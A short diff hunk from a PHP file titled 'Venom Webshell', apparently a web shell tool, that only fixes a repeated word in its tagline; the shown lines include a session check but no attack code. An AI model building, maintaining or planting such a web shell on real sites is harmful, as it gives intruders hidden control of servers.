@@ -78,7 +78,7 @@ if(empty($_SESSION['xboi'])){
 
 <div class="container">
     <h3>Venom Webshell</h3>
-    <blockquote>I make tools which break break tools.</blockquote>
+    <blockquote>I make tools which break tools.</blockquote>
 </div>
 
 <div class="container">
